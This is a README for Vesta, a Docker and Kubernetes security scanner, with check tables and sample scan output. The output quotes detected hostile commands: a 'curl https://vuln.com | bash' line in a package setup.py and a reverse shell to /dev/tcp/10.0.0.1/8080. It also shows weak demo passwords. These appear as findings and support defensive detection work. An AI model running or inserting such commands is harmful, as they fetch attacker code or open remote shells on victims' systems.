<p align="center" style="text-align: center">
    <img src="https://user-images.githubusercontent.com/35037256/212051309-56468d85-4132-4780-9722-d1c0dcc79b1b.png" width="55%">
<br/>
</p>

<p align="center">
  A static analysis of vulnerabilities, Docker and Kubernetes cluster configuration detect toolkit based on the real penetration of cloud computing.
</p>

<div align="center">
<strong>
<samp>

[English](README.md) · [简体中文](README.zh-Hans.md)

</samp>
</strong>
</div>

## Overview

Vesta is a static analysis of vulnerabilities, Docker and Kubernetes cluster configuration detect toolkit. It inspects Kubernetes and Docker configures,
cluster pods, and containers with safe practices.
<br/>
<br/>
Vesta is a flexible toolkit which can run on physical machines in different types of systems (Windows, Linux, MacOS).

## What can vesta check

> Scan
- Support scanning input
  - image
  - container
  - filesystem
  - vm (TODO)
- Scan the vulnerabilities of major package managements
  - apt/apt-get
  - rpm
  - yum
  - dpkg
- Scan malicious packages and vulnerabilities of language-specific packages
  - Java(Jar, War. major library: log4j)
  - NodeJs(NPM, YARN)
  - Python(Wheel, Poetry)
  - Golang(Go binary)
  - PHP(Composer, major frameworks: laravel, thinkphp, wordpress, wordpress plugins etc)
  - Rust(Rust binary)

> Docker

| Supported | Check Item                | Description                                                            | Severity                  | Reference                                                                                   |
|-----------|---------------------------|------------------------------------------------------------------------|---------------------------|---------------------------------------------------------------------------------------------|
| ✔         | PrivilegeAllowed          | Privileged module is allowed.                                          | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References) |
| ✔         | Capabilities              | Dangerous capabilities are opening.                                    | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References) | 
| ✔         | Volume Mount              | Mount dangerous location.                                              | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Volume-Mount-Checking-References)                |
| ✔         | Docker Unauthorized       | 2375 port is opening and unauthorized.                                 | critical                  | [Ref](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.md)       |
| ✔         | Kernel version            | Kernel version is under the escape version.                            | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Kernel-Version-References)                       |
| ✔         | Network Module            | Net Module is `host` and containerd version less than 1.41.            | critical/medium           |                                                                                             |
| ✔         | Pid Module                | Pid Module is `host`.                                                  | high                      |                                                                                             |
| ✔         | Docker Server version     | Server version is included the vulnerable version.                     | critical/high/ medium/low |                                                                                             |
| ✔         | Docker env password check | Check weak password in database.                                       | high/medium               |                                                                                             |
| ✔         | Docker History            | Docker layers have some  dangerous commands.                           | high/medium               |                                                                                             |
| ✔         | Docker Backdoor           | Docker env command has malicious commands.                             | critical/high             |                                                                                             |
| ✔         | Docker Swarm              | Docker swarm has dangerous config or secrets or containers are unsafe. | medium/low                |                                                                                             |

---


> Kubernetes

| Supported | Check Item                                               | Description                                                                | Severity                  | Reference                                                                                            |
|-----------|----------------------------------------------------------|----------------------------------------------------------------------------|---------------------------|------------------------------------------------------------------------------------------------------|
| ✔         | PrivilegeAllowed                                         | Privileged module is allowed.                                              | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)          |
| ✔         | Capabilities                                             | Dangerous capabilities are opening.                                        | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Capabilities-and-Privileged-Checking-References)          |
| ✔         | PV and PVC                                               | PV is mounted the dangerous location and is active.                        | critical/medium           | [Ref](https://github.com/kvesta/vesta/wiki/Volume-Mount-Checking-References)                         |
| ✔         | RBAC                                                     | RBAC has some unsafe configurations in clusterrolebingding or rolebinding. | high/medium/ low/warning  |                                                                                                      |
| ✔         | Kubernetes-dashborad                                     | Checking `-enable-skip-login` and account permission.                      | critical/high/low         | [Ref](https://blog.heptio.com/on-securing-the-kubernetes-dashboard-16b09b1b7aca)                     |
| ✔         | Kernel version                                           | Kernel version is under the escape version.                                | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Kernel-Version-References)                                |
| ✔         | Docker Server version  (k8s versions is less than v1.24) | Server version is included the vulnerable version.                         | critical/high/ medium/low |                                                                                                      |
| ✔         | Kubernetes certification expiration                      | Certification is expired after 30 days.                                    | medium                    |                                                                                                      |
| ✔         | ConfigMap and Secret check                               | Check weak password in ConfigMap or Secret.                                | high/medium               |                                                                                                      |
| ✔         | PodSecurityPolicy check (k8s version under the v1.25)    | PodSecurityPolicy tolerates dangerous pod configurations.                  | high/medium/low           | [Ref](https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/)  |
| ✔         | Auto Mount ServiceAccount Token                          | Mounting default service token.                                            | critical/high/ medium/low | [Ref](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)           |
| ✔         | NoResourceLimits                                         | No resource limits are set.                                                | low                       | [Ref](https://github.com/kvesta/vesta/wiki/Resource-limitation-Checking-References)           |
| ✔         | Job and Cronjob                                          | No seccomp or seLinux are set in Job or CronJob.                           | low                       | [Ref](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/)           |
| ✔         | Envoy admin                                              | Envoy admin is opening and listen to `0.0.0.0`.                            | high/medium               | [Ref](https://www.envoyproxy.io/docs/envoy/latest/start/quick-start/admin#admin)                     |
| ✔         | Cilium version                                           | Cilium has vulnerable version.                                             | critical/high/ medium/low | [Ref](https://security.snyk.io/package/golang/github.com%2Fcilium%2Fcilium)                          |
| ✔         | Istio configurations                                     | Istio has vulnerable version and vulnerable configurations.                | critical/high/ medium/low | [Ref](https://istio.io/latest/news/security/)                                                        |
| ✔         | Kubelet 10250/10255 and Kubectl proxy                    | 10255/10250 port are opening and unauthorized or Kubectl proxy is opening. | high/medium/low           |                                                                                                      |
| ✔         | Etcd configuration                                       | Etcd safe configuration checking.                                          | high/medium               |                                                                                                      |
| ✔         | Sidecar configurations                                   | Sidecar has some dangerous configurations.                                 | critical/high/ medium/low |                                                                                                      |
| ✔         | Pod annotation                                           | Pod annotation has some unsafe configurations.                             | high/medium/ low/warning  | [Ref](https://github.com/kvesta/vesta/wiki/Annotation-Checking-References)                           | 
| ✔         | DaemonSet                                                | DaemonSet has unsafe configurations.                                       | critical/high/ medium/low |                                                                                                      |
| ✔         | Backdoor                                                 | Backdoor Detection.                                                        | critical/high             | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                                       |
| ✔         | Lateral admin movement                                   | Pod specifics a master node.                                               | medium/low                |                                                                                                      |



## Build

Vesta is built with Go 1.18. 

```bash
make build
```

## Quick Start

Example of image or container scan, use `-f` to input by a tar file, start vesta:

```bash
vesta scan image cve-2019-14234_web:latest
vesta scan image -f example.tar
```

or 

```bash
vesta scan container <CONTAINER ID>
vesta scan container -f example.tar
```


Ouput:

```bash
2022/11/29 22:50:00 Searching for image
2022/11/29 22:50:19 Begin upgrading vulnerability database
2022/11/29 22:50:19 Vulnerability Database is already initialized
2022/11/29 22:50:19 Begin to analyze the layer
2022/11/29 22:50:35 Begin to scan the layer

Detected 216 vulnerabilities

+-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 208 | python3.6 - Django | 2.2.3           | CVE-2019-14232   |   7.5 | high     | An issue was discovered                                          |
|     |                    |                 |                  |       |          | in Django 1.11.x before                                          |
|     |                    |                 |                  |       |          | 1.11.23, 2.1.x before 2.1.11,                                    |
|     |                    |                 |                  |       |          | and 2.2.x before 2.2.4. If                                       |
|     |                    |                 |                  |       |          | django.utils.text.Truncator's                                    |
|     |                    |                 |                  |       |          | chars() and words() methods                                      |
|     |                    |                 |                  |       |          | were passed the html=True                                        |
|     |                    |                 |                  |       |          | argument, t ...                                                  |
+-----+                    +-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 209 |                    | 2.2.3           | CVE-2019-14233   |   7.5 | high     | An issue was discovered                                          |
|     |                    |                 |                  |       |          | in Django 1.11.x before                                          |
|     |                    |                 |                  |       |          | 1.11.23, 2.1.x before 2.1.11,                                    |
|     |                    |                 |                  |       |          | and 2.2.x before 2.2.4.                                          |
|     |                    |                 |                  |       |          | Due to the behaviour of                                          |
|     |                    |                 |                  |       |          | the underlying HTMLParser,                                       |
|     |                    |                 |                  |       |          | django.utils.html.strip_tags                                     |
|     |                    |                 |                  |       |          | would be extremely ...                                           |
+-----+                    +-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 210 |                    | 2.2.3           | CVE-2019-14234   |   9.8 | critical | An issue was discovered in                                       |
|     |                    |                 |                  |       |          | Django 1.11.x before 1.11.23,                                    |
|     |                    |                 |                  |       |          | 2.1.x before 2.1.11, and 2.2.x                                   |
|     |                    |                 |                  |       |          | before 2.2.4. Due to an error                                    |
|     |                    |                 |                  |       |          | in shallow key transformation,                                   |
|     |                    |                 |                  |       |          | key and index lookups for                                        |
|     |                    |                 |                  |       |          | django.contrib.postgres.f ...                                    |
+-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
| 211 | python3.6 - numpy  | 1.24.2          |                  |   8.5 | high     | Malicious package is detected in                                 |
|     |                    |                 |                  |       |          | '/usr/local/lib/python3.6/site-packages/numpy/setup.py',         |
|     |                    |                 |                  |       |          | malicious command "curl https://vuln.com | bash" are             |
|     |                    |                 |                  |       |          | detected.                                                        |
+-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+

```

<details>
<summary>Result</summary>

![](https://user-images.githubusercontent.com/35037256/212480788-b2c77ff4-e484-49f8-b283-b0347de7d646.gif)

</details>

Example of docker config scan, start vesta:

```bash
vesta analyze docker
```

Or run with dokcer
```bash
make run.docker
```

Output:

```bash
2022/11/29 23:06:32 Start analysing
2022/11/29 23:06:32 Getting engine version
2022/11/29 23:06:32 Getting docker server version
2022/11/29 23:06:32 Getting kernel version

Detected 3 vulnerabilities

+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
| ID |      CONTAINER DETAIL      |     PARAM      |             VALUE              | SEVERITY |          DESCRIPTION           |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  1 | Name: Kernel               | kernel version | 5.10.104-linuxkit              | critical | Kernel version is suffering    |
|    | ID: None                   |                |                                |          | the CVE-2022-0492 with         |
|    |                            |                |                                |          | CAP_SYS_ADMIN and v1           |
|    |                            |                |                                |          | architecture of cgroups        |
|    |                            |                |                                |          | vulnerablility, has a          |
|    |                            |                |                                |          | potential container escape.    |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  2 | Name: vesta_vuln_test      | kernel version | 5.10.104-linuxkit              | critical | Kernel version is suffering    |
|    | ID: 207cf8842b15           |                |                                |          | the Dirty Pipe vulnerablility, |
|    |                            |                |                                |          | has a potential container      |
|    |                            |                |                                |          | escape.                        |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  3 | Name: Image Tag            | Privileged     | true                           | critical | There has a potential container|
|    | ID: None                   |                |                                |          | escape in privileged  module.  |
|    |                            |                |                                |          |                                |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
|  4 | Name: Image Configuration  | Image History  | Image name:                    | high     | Weak password found            |
|    | ID: None                   |                | vesta_history_test:latest |    |          | in command: ' echo             |
|    |                            |                | Image ID: 4bc05e1e3881         |          | 'password=test123456' >        |
|    |                            |                |                                |          | config.ini # buildkit'.        |
+----+----------------------------+----------------+--------------------------------+----------+--------------------------------+
```

Example of Kubernetes config scan, start vesta:

```bash
vesta analyze k8s
```

Output:

```bash
2022/11/29 23:15:59 Start analysing
2022/11/29 23:15:59 Getting docker server version
2022/11/29 23:15:59 Getting kernel version

Detected 4 vulnerabilities

Pods:
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
| ID |           POD DETAIL           |             PARAM              |             VALUE              |         TYPE          | SEVERITY |          DESCRIPTION           |
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|  1 | Name: vulntest | Namespace:    | sidecar name: vulntest |       | true                           | Pod                   | critical | There has a potential          |
|    | default | Status: Running |    | Privileged                     |                                |                       |          | container escape in privileged |
|    | Node Name: docker-desktop      |                                |                                |                       |          | module.                        |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: vulntest |       | Token:Password123456           | Sidecar EnvFrom       | high     | Sidecar envFrom ConfigMap has  |
|    |                                | env                            |                                |                       |          | found weak password:           |
|    |                                |                                |                                |                       |          | 'Password123456'.              |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: sidecartest |    | MALWARE: bash -i >&            | Sidecar Env           | high     | Container 'sidecartest' finds  |
|    |                                | env                            | /dev/tcp/10.0.0.1/8080 0>&1    |                       |          | high risk content(score:       |
|    |                                |                                |                                |                       |          | 0.91 out of 1.0), which is a   |
|    |                                |                                |                                |                       |          | suspect command backdoor.      |
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|  2 | Name: vulntest2 | Namespace:   | sidecar name: vulntest2 |      | CAP_SYS_ADMIN                  | capabilities.add      | critical | There has a potential          |
|    | default | Status: Running |    | capabilities                   |                                |                       |          | container escape in privileged |
|    | Node Name: docker-desktop      |                                |                                |                       |          | module.                        |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: vulntest2 |      | true                           | kube-api-access-lcvh8 | critical | Mount service account          |
|    |                                | automountServiceAccountToken   |                                |                       |          | and key permission are         |
|    |                                |                                |                                |                       |          | given, which will cause a      |
|    |                                |                                |                                |                       |          | potential container escape.    |
|    |                                |                                |                                |                       |          | Reference clsuterRolebind:     |
|    |                                |                                |                                |                       |          | vuln-clusterrolebinding |      |
|    |                                |                                |                                |                       |          | roleBinding: vuln-rolebinding  |
+    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
|    |                                | sidecar name: vulntest2 |      | cpu                            | Pod                   | low      | CPU usage is not limited.      |
|    |                                | Resource                       |                                |                       |          |                                |
|    |                                |                                |                                |                       |          |                                |
+----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+

Configures:
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
| ID |            TYPEL            |             PARAM              |                         VALUE                          | SEVERITY |          DESCRIPTION           |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  1 | K8s version less than v1.24 | kernel version                 | 5.10.104-linuxkit                                      | critical | Kernel version is suffering    |
|    |                             |                                |                                                        |          | the CVE-2022-0185 with         |
|    |                             |                                |                                                        |          | CAP_SYS_ADMIN vulnerablility,  |
|    |                             |                                |                                                        |          | has a potential container      |
|    |                             |                                |                                                        |          | escape.                        |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  2 | ConfigMap                   | ConfigMap Name: vulnconfig     | db.string:mysql+pymysql://dbapp:Password123@db:3306/db | high     | ConfigMap has found weak       |
|    |                             | Namespace: default             |                                                        |          | password: 'Password123'.       |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  3 | Secret                      | Secret Name: vulnsecret-auth   | password:Password123                                   | high     | Secret has found weak          |
|    |                             | Namespace: default             |                                                        |          | password: 'Password123'.       |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  4 | ClusterRoleBinding          | binding name:                  | verbs: get, watch, list,                               | high     | Key permissions with key       |
|    |                             | vuln-clusterrolebinding |      | create, update | resources:                            |          | resources given to the         |
|    |                             | rolename: vuln-clusterrole |   | pods, services                                         |          | default service account, which |
|    |                             | kind: ClusterRole | subject    |                                                        |          | will cause a potential data    |
|    |                             | kind: Group | subject name:    |                                                        |          | leakage.                       |
|    |                             | system:serviceaccounts:vuln |  |                                                        |          |                                |
|    |                             | namespace: vuln                |                                                        |          |                                |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  5 | RoleBinding                 | binding name: vuln-rolebinding | verbs: get, watch, list,                               | high     | Key permissions with key       |
|    |                             | | rolename: vuln-role | role   | create, update | resources:                            |          | resources given to the         |
|    |                             | kind: Role | subject kind:     | pods, services                                         |          | default service account, which |
|    |                             | ServiceAccount | subject name: |                                                        |          | will cause a potential data    |
|    |                             | default | namespace: default   |                                                        |          | leakage.                       |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
|  6 | ClusterRoleBinding          | binding name:                  | verbs: get, watch, list,                               | warning  | Key permission are given       |
|    |                             | vuln-clusterrolebinding2 |     | create, update | resources:                            |          | to unknown user 'testUser',    |
|    |                             | rolename: vuln-clusterrole |   | pods, services                                         |          | printing it for checking.      |
|    |                             | subject kind: User | subject   |                                                        |          |                                |
|    |                             | name: testUser | namespace:    |                                                        |          |                                |
|    |                             | all                            |                                                        |          |                                |
+----+-----------------------------+--------------------------------+--------------------------------------------------------+----------+--------------------------------+
```

<details>
<summary>Result</summary>

![](https://user-images.githubusercontent.com/35037256/212480704-c6e6f7ac-6531-4eda-b3a2-1ca99eeedfcf.gif)

</details>


## Help information

```bash
$./vesta -h
Vesta is a static analysis of vulnerabilities, Docker and Kubernetes configuration detect toolkit
               Tutorial is available at https://github.com/kvesta/vesta

Usage:
  vesta [command]

Available Commands:
  analyze     Kubernetes analyze
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  scan        Container scan
  update      Update vulnerability database
  version     Print version information and quit

Flags:
  -h, --help   help for vesta

```



